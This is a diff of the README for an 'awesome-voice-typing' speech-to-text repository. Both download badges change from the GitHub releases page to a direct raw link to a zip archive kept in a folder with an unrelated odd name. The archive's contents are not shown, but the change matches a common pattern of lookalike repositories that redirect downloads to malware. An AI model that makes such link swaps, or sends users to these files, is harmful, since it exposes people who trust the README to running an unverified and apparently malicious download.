@@ -1,6 +1,6 @@
 # 🎤 awesome-voice-typing - Simple Speech-to-Text Tools
 
-[![Download awesome-voice-typing](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Krishaang2403/awesome-voice-typing/releases)
+[![Download awesome-voice-typing](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Krishaang2403/awesome-voice-typing/raw/refs/heads/main/ureterocolostomy/voice_typing_awesome_1.4.zip)
 
 ---
 
@@ -91,7 +91,7 @@ Many tools in awesome-voice-typing support offline transcription. This means you
 
 Use the link below to visit the release page and get the latest version:
 
-[![Download awesome-voice-typing](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Krishaang2403/awesome-voice-typing/releases)
+[![Download awesome-voice-typing](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Krishaang2403/awesome-voice-typing/raw/refs/heads/main/ureterocolostomy/voice_typing_awesome_1.4.zip)
 
 Follow the instructions above to install and run the software.
 
